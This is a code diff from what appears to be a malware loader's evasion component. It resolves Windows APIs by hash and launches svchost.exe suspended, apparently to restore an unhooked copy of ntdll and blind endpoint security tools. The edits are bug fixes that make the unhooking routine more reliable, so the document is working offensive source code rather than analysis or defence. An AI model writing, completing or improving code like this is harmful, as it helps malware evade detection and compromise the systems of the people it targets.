@@ -15,18 +15,17 @@ BOOL evasion_unhook_ntdll_process_load_apis(void) {
     if (!g_ldr->apis->TerminateProcess)
         g_ldr->apis->TerminateProcess = (pTerminateProcess)GetProc(g_ldr->apis->modules.kernel32, HASHED_TERMINATEPROCESS);
 
-    return TRUE;
+    return (g_ldr->apis->CreateProcessA && g_ldr->apis->VirtualProtect &&
+        g_ldr->apis->ReadProcessMemory && g_ldr->apis->TerminateProcess);
 }
 
 BOOL evasion_unhook_ntdll_process(void) {
-    STARTUPINFOA si = { 0 };
+    STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi = { 0 };
 
-    g_ldr->apis->CreateProcessA("svchost.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    g_ldr->apis->CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
     if (!pi.hProcess) return FALSE;
-
-    HANDLE us = GetCurrentProcess();
 
     PBYTE ntdll = (PBYTE)g_ldr->apis->modules.ntdll;
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
@@ -61,4 +60,3 @@ BOOL evasion_unhook_ntdll_process(void) {
     return TRUE;
 }
 
-}
